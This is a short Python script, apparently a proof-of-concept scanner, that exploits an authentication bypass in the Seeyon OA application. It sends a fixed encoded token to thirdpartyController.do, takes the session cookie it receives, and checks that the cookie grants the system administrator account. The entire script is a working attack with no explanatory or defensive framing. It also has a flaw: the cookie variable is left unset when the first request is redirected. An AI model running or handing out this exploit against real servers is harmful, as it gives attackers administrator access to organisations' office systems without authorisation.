import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"seeyon/thirdpartyController.do"
	body="method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Content-Type": "application/x-www-form-urlencoded"}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	reditList = response.history
	if len(reditList)>0:
		f_list=[]
		for response in reditList:
			if response.status_code == 200 and "JSESSIONID=" in response.headers["Set-Cookie"] and "/seeyon/common/" in response.text:
				f_list.append(1)
		if len(f_list)==1:
			r0=True
		else:
			r0=False
	else:
		if response.status_code == 200 and "JSESSIONID=" in response.headers["Set-Cookie"] and "/seeyon/common/" in response.text:
			r0=True
			try:
				cookie=response.headers['Set-Cookie']
			except:
				cookie=''
		else:
			r0=False
	url=baseurl+"seeyon/main.do?method=headerjs"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0","Cookie": cookie}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	response.encoding='utf-8'
	if response.status_code == 200 and "\"name\":\"系统管理员\"" in response.text and "\"id\":\"-7273032013234748168\"" in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
